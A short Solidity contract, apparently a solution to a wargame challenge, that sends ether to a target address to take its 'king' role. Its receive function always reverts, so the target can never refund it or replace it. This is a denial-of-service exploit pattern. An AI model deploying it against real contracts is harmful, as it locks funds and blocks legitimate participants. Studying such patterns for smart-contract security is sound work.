contract king {
    function kingMaker(address _addr) public payable {
      _addr.call{value: msg.value, gas: 4000000}("");
    }
    receive() external payable {
        revert("not sent");
    }
}
